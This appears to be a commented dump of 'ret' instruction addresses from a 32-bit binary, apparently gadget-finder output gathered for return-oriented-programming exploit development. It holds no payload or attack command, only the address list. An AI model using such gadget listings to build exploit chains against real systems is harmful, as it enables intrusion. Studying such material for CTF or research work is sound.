# 08049d20:	ret
# 08049d63:	ret
# 08049d68:	ret
# 08049da9:	ret
# 08049db0:	ret
# 08049e13:	ret
# 08049e94:	ret
# 08049eb1:	ret
# 08049eef:	ret
# 08049f0f:	ret
# 08049f2c:	ret
# 08049f3e:	ret
# 08049f3f:	ret
# 08049ffe:	ret
# 0804a010:	ret
# 0804a029:	ret
# 0804a129:	ret
# 0804a396:	ret
# 0804a39a:	ret
# 0804a3aa:	ret
# 0804a5a7:	ret
# 0804a721:	ret
# 0804a730:	ret
# 0804a77c:	ret
# 0804a791:	ret
# 0804a7a0:	ret
# 0804a914:	ret
# 0804a923:	ret
# 0804ac81:	ret
# 0804ac9b:	ret
# 0804ad49:	ret
# 0804ad83:	ret
# 0804ae41:	ret
# 0804ae63:	ret
# 0804b231:	ret
# 0804b241:	ret
# 0804b7c1:	ret
# 0804b7cc:	ret
# 0804b812:	ret
# 0804b82e:	ret
# 0804b84d:	ret
# 0804b981:	ret
# 0804ba04:	ret
# 0804bb3b:	ret
# 0804bbca:	ret
# 0804bbde:	ret
# 0804bc73:	ret
# 0804bccb:	ret
# 0804bcde:	ret
# 0804be3b:	ret
# 0804be8b:	ret
# 0804beab:	ret
# 0804becb:	ret
# 0804bee6:	ret
# 0804bf00:	ret
# 0804bf20:	ret
# 0804bf51:	ret
# 0804bf72:	ret
# 0804bfad:	ret
# 0804bffe:	ret
# 0804c023:	ret
# 0804c141:	ret
# 0804c1a0:	ret
# 0804c1ce:	ret
# 0804c216:	ret
# 0804c2ab:	ret
# 0804c339:	ret
# 0804c401:	ret
# 0804cae6:	ret
# 0804cd30:	ret
# 0804d237:	ret
# 0804d4fe:	ret
# 0804d5cd:	ret
# 0804d5ed:	ret
# 0804d7de:	ret
# 0804dcaa:	ret
# 0804eab4:	ret
# 0804ef2b:	ret
# 0804ef4f:	ret
# 0804ef6a:	ret
# 0804f123:	ret
# 0804f4ce:	ret
# 0804f593:	ret
# 0804f6ae:	ret
# 0804fa72:	ret
# 0804fc19:	ret
# 0804fd4c:	ret
# 0804fd93:	ret
# 0804fea6:	ret
# 08050000:	ret
# 0805004a:	ret
# 0805009f:	ret
# 080500d4:	ret
# 080500fe:	ret
# 08050149:	ret
# 08050375:	ret
# 0805042b:	ret
# 0805048b:	ret
# 08050649:	ret
# 08050942:	ret
# 0805095e:	ret
# 08050a52:	ret
# 08050a9c:	ret
# 08050aa2:	ret
# 08050af2:	ret
# 08050b08:	ret
# 08050ba9:	ret
# 08050bbf:	ret
# 08050bfb:	ret
# 08050c20:	ret
# 08050ce2:	ret
# 08050dc2:	ret
# 08050dc6:	ret
# 08050ddb:	ret
# 08050df4:	ret
# 08050eab:	ret
# 08050f10:	ret
# 08050ff0:	ret
# 0805105d:	ret
# 080510a7:	ret
# 08051108:	ret
# 08051177:	ret
# 080511c0:	ret
# 08051441:	ret
# 08051511:	ret
# 0805152e:	ret
# 08051551:	ret
# 080515e1:	ret
# 08051613:	ret
# 08051623:	ret
# 08051805:	ret
# 080519b6:	ret
# 080519f1:	ret
# 08051a0d:	ret
# 08051a31:	ret
# 08051a61:	ret
# 08051a75:	ret
# 08051ad5:	ret
# 08051bac:	ret
# 08051bbb:	ret
# 08051be5:	ret
# 08051bfb:	ret
# 08051c23:	ret
# 08051c3b:	ret
# 08051c65:	ret
# 08051c7b:	ret
# 08051ca3:	ret
# 08051ea2:	ret
# 08051f3d:	ret
# 08051f45:	ret
# 0805213d:	ret
# 080521c7:	ret
# 08052231:	ret
# 0805241a:	ret
# 0805243a:	ret
# 08052534:	ret
# 0805269d:	ret
# 080526bc:	ret
# 08052727:	ret
# 080527b1:	ret
# 080527ce:	ret
# 0805286a:	ret
# 0805287b:	ret
# 080528a0:	ret
# 080528d3:	ret
# 0805293f:	ret
# 080529a6:	ret
# 08052a3e:	ret
# 08052a6c:	ret
# 08052a93:	ret
# 08052abe:	ret
# 08052acc:	ret
# 08052b39:	ret
# 08052b5e:	ret
# 08052c24:	ret
# 08052c57:	ret
# 08052cc6:	ret
# 08052cdc:	ret
# 08052d03:	ret
# 08052e13:	ret
# 08052e2e:	ret
# 08052f8d:	ret
# 080530c3:	ret
# 0805314b:	ret
# 08053289:	ret
# 080533c1:	ret
# 08053423:	ret
# 080536c6:	ret
# 08053730:	ret
# 08053785:	ret
# 080539ea:	ret
# 08053c4a:	ret
# 08053c84:	ret
# 08053ccb:	ret
# 08053cf6:	ret
# 08053d2d:	ret
# 08053d56:	ret
# 08053dd5:	ret
# 08053ea1:	ret
# 08054126:	ret
# 08054e99:	ret
# 08055fd1:	ret
# 08055fdf:	ret
# 08056147:	ret
# 08056700:	ret
# 080568ea:	ret
# 0805695f:	ret
# 08056aa2:	ret
# 08056de6:	ret
# 08056f5b:	ret
# 080570a7:	ret
# 0805742d:	ret
# 08057609:	ret
# 08057db6:	ret
# 08057e69:	ret
# 08057e8e:	ret
# 08057fc4:	ret
# 080580ba:	ret
# 08058151:	ret
# 08058217:	ret
# 080584d4:	ret
# 080585ea:	ret
# 08058b7e:	ret
# 08058bf3:	ret
# 08058cd7:	ret
# 08058d46:	ret
# 08058d5e:	ret
# 0805902d:	ret
# 080590fe:	ret
# 08059110:	ret
# 08059300:	ret
# 080593e6:	ret
# 080593f9:	ret
# 0805954e:	ret
# 080595ce:	ret
# 08059688:	ret
# 080597ff:	ret
# 080599ae:	ret
# 080599ec:	ret
# 08059cd3:	ret
# 08059d8c:	ret
# 08059dad:	ret
# 08059e50:	ret
# 08059e8b:	ret
# 08059ea9:	ret
# 08059ead:	ret
# 08059f73:	ret
# 08059f88:	ret
# 0805a0d4:	ret
# 0805a10b:	ret
# 0805a1f5:	ret
# 0805a21b:	ret
# 0805a282:	ret
# 0805a29c:	ret
# 0805a2c0:	ret
# 0805a3d3:	ret
# 0805a46b:	ret
# 0805a48e:	ret
# 0805a558:	ret
# 0805a57f:	ret
# 0805a62a:	ret
# 0805a807:	ret
# 0805a82c:	ret
# 0805a8d1:	ret
# 0805a929:	ret
# 0805acfe:	ret
# 0805aff8:	ret
# 0805b13e:	ret
# 0805b6ba:	ret
# 0805b77c:	ret
# 0805b7ba:	ret
# 0805b7ce:	ret
# 0805b89a:	ret
# 0805ba01:	ret
# 0805ba7f:	ret
# 0805bb0e:	ret
# 0805bbff:	ret
# 0805bc15:	ret
# 0805bc3e:	ret
# 0805bdde:	ret
# 0805be71:	ret
# 0805beaf:	ret
# 0805bedf:	ret
# 0805c01b:	ret
# 0805c12f:	ret
# 0805c23e:	ret
# 0805c23f:	ret
# 0805c302:	ret
# 0805c33e:	ret
# 0805c33f:	ret
# 0805c401:	ret
# 0805c44a:	ret
# 0805c455:	ret
# 0805c470:	ret
# 0805c547:	ret
# 0805c5df:	ret
# 0805c5ef:	ret
# 0805c5fa:	ret
# 0805c672:	ret
# 0805c68a:	ret
# 0805c69e:	ret
# 0805c7ba:	ret
# 0805c86d:	ret
# 0805c940:	ret
# 0805caf2:	ret
# 0805cb5b:	ret
# 0805cb71:	ret
# 0805cb9e:	ret
# 0805cbf5:	ret
# 0805cc06:	ret
# 0805cc2b:	ret
# 0805cc9c:	ret
# 0805cccb:	ret
# 0805cce3:	ret
# 0805ccfc:	ret
# 0805cd39:	ret
# 0805cd4c:	ret
# 0805cda4:	ret
# 0805cdeb:	ret
# 0805ce75:	ret
# 0805cea8:	ret
# 0805d0c2:	ret
# 0805d0d2:	ret
# 0805d103:	ret
# 0805d11a:	ret
# 0805d17a:	ret
# 0805d267:	ret
# 0805d27c:	ret
# 0805d2b3:	ret
# 0805d2cc:	ret
# 0805d430:	ret
# 0805d4cb:	ret
# 0805d611:	ret
# 0805d63b:	ret
# 0805d6c9:	ret
# 0805dbc9:	ret
# 0805dc41:	ret
# 0805dd4b:	ret
# 0805de02:	ret
# 0805de5b:	ret
# 0805debc:	ret
# 0805df2d:	ret
# 0805dfb0:	ret
# 0805e00c:	ret
# 0805e02b:	ret
# 0805e049:	ret
# 0805e05e:	ret
# 0805e0e2:	ret
# 0805e10e:	ret
# 0805e169:	ret
# 0805e1e1:	ret
# 0805e24b:	ret
# 0805e36d:	ret
# 0805e3d0:	ret
# 0805e419:	ret
# 0805e549:	ret
# 0805e59c:	ret
# 0805e604:	ret
# 0805e66b:	ret
# 0805e699:	ret
# 0805e6b5:	ret
# 0805e6d0:	ret
# 0805e746:	ret
# 0805e88c:	ret
# 0805e8be:	ret
# 0805e8cc:	ret
# 0805e8fe:	ret
# 0805e90e:	ret
# 0805e9c5:	ret
# 0805e9f9:	ret
# 0805eab9:	ret
# 0805eacf:	ret
# 0805eaf6:	ret
# 0805eb10:	ret
# 0805eb1d:	ret
# 0805eb2e:	ret
# 0805ec5c:	ret
# 0805ecce:	ret
# 0805ed4c:	ret
# 0805ef68:	ret
# 0805f029:	ret
# 0805f191:	ret
# 0805f1fb:	ret
# 0805f23e:	ret
# 0805f23f:	ret
# 0805f2ac:	ret
# 0805f325:	ret
# 0805f45e:	ret
# 0805f4f4:	ret
# 0805f5d2:	ret
# 0805f7b3:	ret
# 0805f7ec:	ret
# 0805f844:	ret
# 0805f8c9:	ret
# 0805fa2c:	ret
# 0805fb38:	ret
# 0805fce3:	ret
# 0805fe1e:	ret
# 0805fe49:	ret
# 0805fe7b:	ret
# 0805fefa:	ret
# 0805ff2c:	ret
# 0805ff7b:	ret
# 080600be:	ret
# 080601ec:	ret
# 0806022c:	ret
# 0806026b:	ret
# 0806028e:	ret
# 080602a8:	ret
# 0806030d:	ret
# 08060349:	ret
# 080603a4:	ret
# 080603be:	ret
# 080603e1:	ret
# 080604bf:	ret
# 080604e9:	ret
# 080605d8:	ret
# 0806061b:	ret
# 0806063e:	ret
# 0806063f:	ret
# 080606e5:	ret
# 080607a4:	ret
# 080607aa:	ret
# 080607be:	ret
# 08060807:	ret
# 0806082c:	ret
# 0806086e:	ret
# 08060923:	ret
# 0806095b:	ret
# 0806098b:	ret
# 080609a9:	ret
# 08060a19:	ret
# 08060a31:	ret
# 08060a46:	ret
# 08060a5c:	ret
# 08060ac5:	ret
# 08060afe:	ret
# 08060b59:	ret
# 08060b68:	ret
# 08060bb2:	ret
# 08060bea:	ret
# 08060c29:	ret
# 08060c36:	ret
# 08060e6e:	ret
# 080611aa:	ret
# 08061301:	ret
# 080613ae:	ret
# 08061506:	ret
# 08061636:	ret
# 08061657:	ret
# 0806168c:	ret
# 08061694:	ret
# 080616b2:	ret
# 080616e2:	ret
# 080616f0:	ret
# 080616f6:	ret
# 08061734:	ret
# 080617c0:	ret
# 080617de:	ret
# 0806181f:	ret
# 0806193e:	ret
# 08061949:	ret
# 08061959:	ret
# 08061966:	ret
# 08061979:	ret
# 08061984:	ret
# 080619a6:	ret
# 080619b6:	ret
# 080619cb:	ret
# 080619d8:	ret
# 080619ec:	ret
# 08061a2b:	ret
# 08061a9f:	ret
# 08061afc:	ret
# 08061b37:	ret
# 08061b6e:	ret
# 08061cbd:	ret
# 08061cf3:	ret
# 08061d0c:	ret
# 08061d40:	ret
# 08061e51:	ret
# 08061e63:	ret
# 08061ec7:	ret
# 08062037:	ret
# 080620ef:	ret
# 0806222b:	ret
# 08062256:	ret
# 0806227c:	ret
# 080622ab:	ret
# 080622ce:	ret
# 08062332:	ret
# 080623ae:	ret
# 080623c5:	ret
# 0806240b:	ret
# 08062452:	ret
# 0806247c:	ret
# 08062490:	ret
# 080624c4:	ret
# 080624f4:	ret
# 0806251a:	ret
# 08062544:	ret
# 0806256a:	ret
# 0806258a:	ret
# 080625ac:	ret
# 080625cb:	ret
# 080625ec:	ret
# 080625f6:	ret
# 0806261a:	ret
# 0806263a:	ret
# 08062656:	ret
# 080626e2:	ret
# 080626e8:	ret
# 08062738:	ret
# 0806279f:	ret
# 080627e9:	ret
# 0806281c:	ret
# 0806281e:	ret
# 0806283b:	ret
# 08062850:	ret
# 08062907:	ret
# 08062967:	ret
# 08062989:	ret
# 080629b6:	ret
# 080629e8:	ret
# 08062a37:	ret
# 08062a5a:	ret
# 08062b34:	ret
# 08062b38:	ret
# 08062b5c:	ret
# 08062c59:	ret
# 08062c8b:	ret
# 08062d0c:	ret
# 08062d64:	ret
# 08062daa:	ret
# 08062e1e:	ret
# 08062e79:	ret
# 08062e8b:	ret
# 08062f18:	ret
# 08063045:	ret
# 0806308a:	ret
# 08063145:	ret
# 0806315b:	ret
# 08063274:	ret
# 08063311:	ret
# 0806338f:	ret
# 0806356e:	ret
# 08063970:	ret
# 080639ae:	ret
# 08063ac2:	ret
# 08063c1e:	ret
# 08063cf9:	ret
# 08063ee5:	ret
# 0806403c:	ret
# 080640d0:	ret
# 080641fe:	ret
# 0806436a:	ret
# 0806480f:	ret
# 080649cf:	ret
# 08064a29:	ret
# 08064c7f:	ret
# 08064c93:	ret
# 08064d68:	ret
# 08064f7c:	ret
# 08064fcc:	ret
# 08064fe1:	ret
# 08065014:	ret
# 0806505a:	ret
# 08065299:	ret
# 08065577:	ret
# 08065598:	ret
# 08065746:	ret
# 080658df:	ret
# 080659dc:	ret
# 08065e14:	ret
# 08065e2f:	ret
# 0806612e:	ret
# 080661fb:	ret
# 0806628f:	ret
# 08066296:	ret
# 080662ad:	ret
# 080662d2:	ret
# 08066386:	ret
# 080664b2:	ret
# 080664d4:	ret
# 0806650d:	ret
# 0806654e:	ret
# 08066666:	ret
# 08066686:	ret
# 080666f1:	ret
# 0806677c:	ret
# 080667a6:	ret
# 080668c9:	ret
# 08066917:	ret
# 08066bdb:	ret
# 08066d6e:	ret
# 08066dc6:	ret
# 08066e7c:	ret
# 08066f7c:	ret
# 08066fc8:	ret
# 0806706d:	ret
# 080670db:	ret
# 080670f8:	ret
# 08067118:	ret
# 080671ee:	ret
# 08067203:	ret
# 0806722c:	ret
# 080672e2:	ret
# 08067323:	ret
# 08067327:	ret
# 08067375:	ret
# 0806738b:	ret
# 080673a7:	ret
# 080673c8:	ret
# 080673e6:	ret
# 0806768a:	ret
# 08067729:	ret
# 08067737:	ret
# 080677a4:	ret
# 080678a7:	ret
# 0806792d:	ret
# 08067a44:	ret
# 08067a65:	ret
# 08067c8b:	ret
# 08067d39:	ret
# 08067e10:	ret
# 08067ee2:	ret
# 08067ee5:	ret
# 08067f08:	ret
# 08067f6c:	ret
# 08067ff1:	ret
# 08068056:	ret
# 0806806b:	ret
# 0806828a:	ret
# 0806843e:	ret
# 0806843f:	ret
# 0806848a:	ret
# 08068499:	ret
# 0806850e:	ret
# 08068559:	ret
# 08068649:	ret
# 0806883c:	ret
# 080688be:	ret
# 080688f9:	ret
# 0806896e:	ret
# 08068af5:	ret
# 08068b08:	ret
# 08068b1c:	ret
# 08068b47:	ret
# 08068b6a:	ret
# 08068b76:	ret
# 08068b8b:	ret
# 08068bab:	ret
# 08068bbe:	ret
# 08068c09:	ret
# 08068c8e:	ret
# 08068cf4:	ret
# 08068d36:	ret
# 08068d84:	ret
# 08068dc8:	ret
# 08068e0a:	ret
# 08068e21:	ret
# 08068e3a:	ret
# 08068e51:	ret
# 08068e82:	ret
# 08068e9e:	ret
# 08068f05:	ret
# 08069051:	ret
# 0806906a:	ret
# 0806918e:	ret
# 080693a3:	ret
# 0806952e:	ret
# 08069740:	ret
# 0806984b:	ret
# 0806986b:	ret
# 0806987e:	ret
# 080698d5:	ret
# 080698ee:	ret
# 08069938:	ret
# 08069974:	ret
# 080699ba:	ret
# 080699f8:	ret
# 08069a34:	ret
# 08069b9e:	ret
# 08069bca:	ret
# 08069bfa:	ret
# 08069c1d:	ret
# 08069c3e:	ret
# 08069c61:	ret
# 08069cae:	ret
# 08069cc6:	ret
# 08069cdf:	ret
# 08069d6c:	ret
# 08069dc8:	ret
# 08069e84:	ret
# 08069ec8:	ret
# 08069efb:	ret
# 08069f2c:	ret
# 08069f5f:	ret
# 08069f8b:	ret
# 08069fbe:	ret
# 08069fef:	ret
# 0806a022:	ret
# 0806a05d:	ret
# 0806a090:	ret
# 0806a0d1:	ret
# 0806a114:	ret
# 0806a150:	ret
# 0806a178:	ret
# 0806a193:	ret
# 0806a1d4:	ret
# 0806a217:	ret
# 0806a24a:	ret
# 0806a27a:	ret
# 0806a29d:	ret
# 0806a2be:	ret
# 0806a2e1:	ret
# 0806a32e:	ret
# 0806a347:	ret
# 0806a3de:	ret
# 0806a416:	ret
# 0806a448:	ret
# 0806a47b:	ret
# 0806a4ac:	ret
# 0806a4df:	ret
# 0806a50b:	ret
# 0806a53e:	ret
# 0806a56f:	ret
# 0806a5a2:	ret
# 0806a5dd:	ret
# 0806a610:	ret
# 0806a651:	ret
# 0806a694:	ret
# 0806a6d0:	ret
# 0806a6f8:	ret
# 0806a713:	ret
# 0806a754:	ret
# 0806a797:	ret
# 0806aac3:	ret
# 0806abe3:	ret
# 0806ad03:	ret
# 0806ae23:	ret
# 0806af43:	ret
# 0806b063:	ret
# 0806b183:	ret
# 0806b2b3:	ret
# 0806b3e3:	ret
# 0806b503:	ret
# 0806b623:	ret
# 0806b743:	ret
# 0806b863:	ret
# 0806b983:	ret
# 0806baa3:	ret
# 0806bafc:	ret
# 0806bb4a:	ret
# 0806bb58:	ret
# 0806bb6a:	ret
# 0806bb7a:	ret
# 0806bb8a:	ret
# 0806bb9a:	ret
# 0806bbaa:	ret
# 0806bbba:	ret
# 0806bbf3:	ret
# 0806bc09:	ret
# 0806bc0c:	ret
# 0806bda1:	ret
# 0806bdb2:	ret
# 0806bdc9:	ret
# 0806bf41:	ret
# 0806bf91:	ret
# 0806bfa2:	ret
# 0806d0ae:	ret
# 0806d0bd:	ret
# 0806d0cd:	ret
# 0806d0dd:	ret
# 0806d0ed:	ret
# 0806d0fd:	ret
# 0806d10d:	ret
# 0806d11d:	ret
# 0806d15d:	ret
# 0806d3c0:	ret
# 0806d47d:	ret
# 0806d538:	ret
# 0806d5d6:	ret
# 0806d60a:	ret
# 0806d646:	ret
# 0806d6b9:	ret
# 0806d6c3:	ret
# 0806d6da:	ret
# 0806d6e2:	ret
# 0806d761:	ret
# 0806d7b9:	ret
# 0806d7be:	ret
# 0806d847:	ret
# 0806d8e2:	ret
# 0806d990:	ret
# 0806da0e:	ret
# 0806da8b:	ret
# 0806db16:	ret
# 0806dbb4:	ret
# 0806dc3c:	ret
# 0806dcc9:	ret
# 0806dd64:	ret
# 0806de12:	ret
# 0806deaa:	ret
# 0806deb4:	ret
# 0806deb9:	ret
# 0806debb:	ret
# 0806df47:	ret
# 0806dff2:	ret
# 0806e0b0:	ret
# 0806e13c:	ret
# 0806e170:	ret
# 0806e1a0:	ret
# 0806e353:	ret
# 0806e3c3:	ret
# 0806e417:	ret
# 0806f6b7:	ret
# 0806f6eb:	ret
# 0806f731:	ret
# 0806f76b:	ret
# 0806f777:	ret
# 0806f789:	ret
# 0806f79f:	ret
# 0806f7ad:	ret
# 0806f7bf:	ret
# 0806f7cd:	ret
# 0806f7e1:	ret
# 0806f803:	ret
# 0806f821:	ret
# 0806f845:	ret
# 0806f865:	ret
# 0806f885:	ret
# 0806f896:	ret
# 0806f8a8:	ret
# 0806f8be:	ret
# 0806f8c6:	ret
# 0806f8dc:	ret
# 0806f8ee:	ret
# 0806f8fc:	ret
# 0806f90a:	ret
# 0806f920:	ret
# 0806f942:	ret
# 0806f960:	ret
# 0806f980:	ret
# 0806f9a4:	ret
# 0806f9c4:	ret
# 0806f9e4:	ret
# 0806f9fa:	ret
# 0806fba3:	ret
# 0806fc13:	ret
# 0806fc67:	ret
# 08070f08:	ret
# 08070f3c:	ret
# 08070f82:	ret
# 08070fbc:	ret
# 08070fc7:	ret
# 08070fda:	ret
# 08070ff0:	ret
# 0807100e:	ret
# 08071020:	ret
# 0807103e:	ret
# 08071052:	ret
# 08071074:	ret
# 08071092:	ret
# 080710b6:	ret
# 080710d6:	ret
# 080710f6:	ret
# 08071106:	ret
# 08071119:	ret
# 0807112f:	ret
# 08071137:	ret
# 0807114d:	ret
# 0807115f:	ret
# 0807116d:	ret
# 0807117b:	ret
# 08071191:	ret
# 080711b3:	ret
# 080711d1:	ret
# 080711f1:	ret
# 08071215:	ret
# 08071235:	ret
# 08071255:	ret
# 0807126b:	ret
# 08071375:	ret
# 0807138c:	ret
# 08071392:	ret
# 080713af:	ret
# 080713cc:	ret
# 080713e9:	ret
# 08071400:	ret
# 08071406:	ret
# 08071450:	ret
# 0807148e:	ret
# 0807153e:	ret
# 08071594:	ret
# 080715a7:	ret
# 080715b9:	ret
# 080715cf:	ret
# 080715d7:	ret
# 080715ed:	ret
# 080715ff:	ret
# 0807160d:	ret
# 08071623:	ret
# 08071645:	ret
# 08071663:	ret
# 08071683:	ret
# 080716a5:	ret
# 080716c5:	ret
# 080716e5:	ret
# 080716f6:	ret
# 08071708:	ret
# 0807171e:	ret
# 08071726:	ret
# 0807173c:	ret
# 0807174e:	ret
# 0807175c:	ret
# 0807176c:	ret
# 08071782:	ret
# 080717a4:	ret
# 080717c2:	ret
# 080717e2:	ret
# 08071804:	ret
# 08071824:	ret
# 08071844:	ret
# 08071864:	ret
# 08071975:	ret
# 0807198c:	ret
# 08071992:	ret
# 080719af:	ret
# 080719cc:	ret
# 080719e9:	ret
# 08071a00:	ret
# 08071a06:	ret
# 08071a50:	ret
# 08071a8e:	ret
# 08071b3f:	ret
# 08071b95:	ret
# 08071ba7:	ret
# 08071bba:	ret
# 08071bd0:	ret
# 08071be8:	ret
# 08071bfe:	ret
# 08071c10:	ret
# 08071c2e:	ret
# 08071c44:	ret
# 08071c66:	ret
# 08071c84:	ret
# 08071ca4:	ret
# 08071cc6:	ret
# 08071ce6:	ret
# 08071d06:	ret
# 08071d16:	ret
# 08071d29:	ret
# 08071d3f:	ret
# 08071d47:	ret
# 08071d5d:	ret
# 08071d6f:	ret
# 08071d7d:	ret
# 08071d8d:	ret
# 08071da3:	ret
# 08071dc5:	ret
# 08071de3:	ret
# 08071e03:	ret
# 08071e25:	ret
# 08071e45:	ret
# 08071e65:	ret
# 08071e85:	ret
# 08071ff1:	ret
# 08072037:	ret
# 08072094:	ret
# 080720da:	ret
# 08072120:	ret
# 08072173:	ret
# 08072183:	ret
# 08072194:	ret
# 080721a4:	ret
# 080721b4:	ret
# 080721c4:	ret
# 080721d4:	ret
# 080721e4:	ret
# 080721f4:	ret
# 08072204:	ret
# 08072214:	ret
# 08072224:	ret
# 08072234:	ret
# 08072244:	ret
# 08072254:	ret
# 08072263:	ret
# 080722cd:	ret
# 0807236a:	ret
# 08072373:	ret
# 0807242d:	ret
# 0807248e:	ret
# 0807251e:	ret
# 08072568:	ret
# 0807258b:	ret
# 080725b5:	ret
# 080725de:	ret
# 080725e2:	ret
# 080725f3:	ret
# 08072603:	ret
# 08072613:	ret
# 08072623:	ret
# 08072633:	ret
# 08072643:	ret
# 08072653:	ret
# 08072663:	ret
# 08072673:	ret
# 08072683:	ret
# 08072693:	ret
# 080726a2:	ret
# 080726ea:	ret
# 08072702:	ret
# 08072731:	ret
# 08072785:	ret
# 080727e3:	ret
# 080727f8:	ret
# 0807286e:	ret
# 0807287e:	ret
# 08072887:	ret
# 08072895:	ret
# 080728a7:	ret
# 080728b7:	ret
# 080728c2:	ret
# 08072bb9:	ret
# 08072bdf:	ret
# 08072c06:	ret
# 08072c2f:	ret
# 08072c97:	ret
# 08072cd5:	ret
# 08072d08:	ret
# 08072d3f:	ret
# 08072d68:	ret
# 08072d7d:	ret
# 08072d8d:	ret
# 08072d9d:	ret
# 08072da9:	ret
# 08072db9:	ret
# 08072dc9:	ret
# 08072dd9:	ret
# 08072de9:	ret
# 08072df9:	ret
# 08072e09:	ret
# 08072e19:	ret
# 08072e25:	ret
# 08072e83:	ret
# 08072edc:	ret
# 08072f2c:	ret
# 08072f60:	ret
# 08072f74:	ret
# 08072f79:	ret
# 08072f7e:	ret
# 08072f83:	ret
# 08072f88:	ret
# 08072f8d:	ret
# 08072f92:	ret
# 08072f97:	ret
# 08072f9c:	ret
# 08072fa1:	ret
# 08072fa6:	ret
# 08072fab:	ret
# 08072fb0:	ret
# 08072fb5:	ret
# 08072fba:	ret
# 08073006:	ret
# 08073042:	ret
# 08073048:	ret
# 0807304d:	ret
# 0807304f:	ret
# 08073055:	ret
# 0807305b:	ret
# 08073061:	ret
# 080730b6:	ret
# 080730c7:	ret
# 080730db:	ret
# 080730f9:	ret
# 08073121:	ret
# 08073583:	ret
# 08073641:	ret
# 080737a3:	ret
# 080739c3:	ret
# 08073be3:	ret
# 08073e03:	ret
# 08074023:	ret
# 08074243:	ret
# 08074473:	ret
# 08074541:	ret
# 080746a3:	ret
# 080748c3:	ret
# 08074ae3:	ret
# 08074d03:	ret
# 08074f23:	ret
# 08075143:	ret
# 08075363:	ret
# 08075459:	ret
# 0807547f:	ret
# 08075497:	ret
# 080754b9:	ret
# 080754d9:	ret
# 080754f9:	ret
# 08075519:	ret
# 08075539:	ret
# 08075559:	ret
# 080755b6:	ret
# 080755cd:	ret
# 080755d1:	ret
# 080755eb:	ret
# 08075631:	ret
# 08075920:	ret
# 08075934:	ret
# 0807594b:	ret
# 08075aee:	ret
# 08075b72:	ret
# 08075b97:	ret
# 08075bac:	ret
# 08075c16:	ret
# 08075d35:	ret
# 08075d60:	ret
# 08075d67:	ret
# 08075d7c:	ret
# 08075df6:	ret
# 08075e6a:	ret
# 08075ee9:	ret
# 08075f75:	ret
# 08075fd2:	ret
# 08076013:	ret
# 08076099:	ret
# 08076100:	ret
# 0807612b:	ret
# 08076175:	ret
# 080761c6:	ret
# 08076365:	ret
# 0807642a:	ret
# 0807644a:	ret
# 08076458:	ret
# 08076511:	ret
# 080765de:	ret
# 0807666e:	ret
# 080766dd:	ret
# 080768dc:	ret
# 08076959:	ret
# 08076c54:	ret
# 08076c97:	ret
# 08076ccb:	ret
# 08076cec:	ret
# 08076cfe:	ret
# 08076e37:	ret
# 08076eff:	ret
# 08076f0e:	ret
# 08077059:	ret
# 08077201:	ret
# 08077228:	ret
# 08077289:	ret
# 080772e8:	ret
# 080773d4:	ret
# 080774f0:	ret
# 08077711:	ret
# 0807781a:	ret
# 0807784e:	ret
# 08077a07:	ret
# 08077d02:	ret
# 08077d09:	ret
# 08077d56:	ret
# 08077dbe:	ret
# 08077ef9:	ret
# 08077f3e:	ret
# 08077f3f:	ret
# 08077fd7:	ret
# 080782fb:	ret
# 08078321:	ret
# 0807834f:	ret
# 0807835b:	ret
# 0807837e:	ret
# 08078433:	ret
# 0807849e:	ret
# 08078695:	ret
# 080786d0:	ret
# 080786e8:	ret
# 080787c3:	ret
# 08078fb9:	ret
# 0807915c:	ret
# 08079226:	ret
# 08079275:	ret
# 080792ae:	ret
# 0807930b:	ret
# 08079379:	ret
# 080794f0:	ret
# 0807954d:	ret
# 08079855:	ret
# 0807986b:	ret
# 0807997a:	ret
# 080799ee:	ret
# 08079aaf:	ret
# 08079abe:	ret
# 08079dae:	ret
# 08079e36:	ret
# 0807ac7e:	ret
# 0807b0e6:	ret
# 0807b2b3:	ret
# 0807ba51:	ret
# 0807ba82:	ret
# 0807bb20:	ret
# 0807bb2d:	ret
# 0807bc32:	ret
# 0807c038:	ret
# 0807c41b:	ret
# 0807c547:	ret
# 0807c8cb:	ret
# 0807c907:	ret
# 0807c92b:	ret
# 0807c946:	ret
# 0807c984:	ret
# 0807c9b6:	ret
# 0807c9f6:	ret
# 0807ca11:	ret
# 0807ca41:	ret
# 0807ca9f:	ret
# 0807caf5:	ret
# 0807cb3c:	ret
# 0807cb4b:	ret
# 0807cb74:	ret
# 0807cb8f:	ret
# 0807cba0:	ret
# 0807cbdc:	ret
# 0807cbeb:	ret
# 0807cbf9:	ret
# 0807cc14:	ret
# 0807cc2f:	ret
# 0807cc40:	ret
# 0807ccaa:	ret
# 0807cdb2:	ret
# 0807cf34:	ret
# 0807cf43:	ret
# 0807cf5c:	ret
# 0807cf77:	ret
# 0807cf90:	ret
# 0807cfc3:	ret
# 0807cff7:	ret
# 0807d333:	ret
# 0807d438:	ret
# 0807d43b:	ret
# 0807d8a1:	ret
# 0807d984:	ret
# 0807d9cd:	ret
# 0807da29:	ret
# 0807da8b:	ret
# 0807dad3:	ret
# 0807daea:	ret
# 0807db38:	ret
# 0807db5a:	ret
# 0807db85:	ret
# 0807dbc5:	ret
# 0807dc01:	ret
# 0807dc6d:	ret
# 0807dcb8:	ret
# 0807dccb:	ret
# 0807dce3:	ret
# 0807dd0b:	ret
# 0807dd4b:	ret
# 0807dda3:	ret
# 0807de33:	ret
# 0807de77:	ret
# 0807dea9:	ret
# 0807ded9:	ret
# 0807dee8:	ret
# 0807df2f:	ret
# 0807df3f:	ret
# 0807df68:	ret
# 0807dfaf:	ret
# 0807dfbf:	ret
# 0807dff1:	ret
# 0807e018:	ret
# 0807e131:	ret
# 0807e297:	ret
# 0807e2e2:	ret
# 0807e31c:	ret
# 0807e344:	ret
# 0807e353:	ret
# 0807e456:	ret
# 0807e46f:	ret
# 0807e47e:	ret
# 0807e553:	ret
# 0807e562:	ret
# 0807e649:	ret
# 0807e8c1:	ret
# 0807e9a4:	ret
# 0807e9c8:	ret
# 0807e9f8:	ret
# 0807ea0c:	ret
# 0807ea63:	ret
# 0807eb73:	ret
# 0807ebad:	ret
# 0807ebee:	ret
# 0807ec00:	ret
# 0807ee19:	ret
# 0807ef50:	ret
# 0807f012:	ret
# 0807f0f0:	ret
# 0807f111:	ret
# 0807f147:	ret
# 0807f185:	ret
# 0807f1b3:	ret
# 0807f207:	ret
# 0807f22f:	ret
# 0807f236:	ret
# 0807f2b1:	ret
# 0807f2b9:	ret
# 0807f317:	ret
# 0807f33f:	ret
# 0807f346:	ret
# 0807f3a6:	ret
# 0807f411:	ret
# 0807f482:	ret
# 0807f4aa:	ret
# 0807f4b6:	ret
# 0807f529:	ret
# 0807f591:	ret
# 0807f606:	ret
